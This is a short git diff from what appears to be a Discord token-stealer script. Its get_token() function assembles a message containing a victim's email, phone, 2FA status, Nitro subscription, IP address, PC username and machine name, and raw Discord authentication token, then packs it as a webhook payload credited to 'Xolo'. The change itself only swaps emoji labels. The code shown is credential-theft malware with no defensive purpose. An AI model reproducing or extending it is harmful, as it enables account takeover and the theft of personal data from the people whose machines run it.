@@ -111,9 +111,9 @@ def get_token():
                             d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                             days_left = abs((d2 - d1).days) 
                         embed = f"""**{user_name}** *({user_id})*\n 
-> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
+> :baby: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
 > :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
-> :rofl: __Token__\n\t`{tok}`\n
+> :racehorse: __Token__\n\t`{tok}`\n
 *Made by xolo* **|** https://github.com/x9o **|** <@992952207588720730>"""
                         payload = json.dumps({'content': embed, 'username': 'Xolo', 'avatar_url': 'https://tr.rbxcdn.com/04c280304caaadc517c7a61a377afa61/420/420/Image/Png'})
                         try:
